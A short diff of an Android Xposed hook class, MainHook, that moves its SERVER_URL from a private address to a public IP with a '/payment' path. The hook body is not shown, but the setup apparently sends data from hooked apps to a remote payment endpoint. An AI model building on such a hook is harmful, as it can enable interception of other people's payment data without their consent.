@@ -13,7 +13,7 @@ import java.net.URL;
 
 public class MainHook implements IXposedHookLoadPackage {
     
-    private static final String SERVER_URL = "http://10.4.0.10:5000/payment";
+    private static final String SERVER_URL = "http://43.162.112.203:5000/payment";
     
     @Override
     public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
